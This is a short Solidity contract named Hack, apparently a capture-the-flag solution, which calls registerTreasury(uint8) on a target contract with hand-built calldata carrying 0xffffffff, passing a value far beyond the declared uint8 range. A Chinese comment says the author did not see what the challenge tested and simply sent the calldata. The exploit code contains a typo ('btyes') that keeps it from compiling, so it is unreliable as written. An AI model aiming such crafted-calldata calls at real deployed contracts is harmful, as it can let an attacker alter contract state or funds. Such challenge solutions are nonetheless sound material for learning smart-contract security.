// SPDX-License-Identifier: MIT
pragma solidity >0.6.4;
contract Hack{
    address public target;
    bool public  success=false;
    constructor(address add) {
        target=add;
    }
    function solve()public {
        btyes memory test = abi.encodeWithSelector(bytes4(keccak256("registerTreasury(uint8)")), 0xffffffff);
        (success, ) = target.call(test);
    }
}
/*没懂这题考察啥，直接传个calldata过去就好了
 */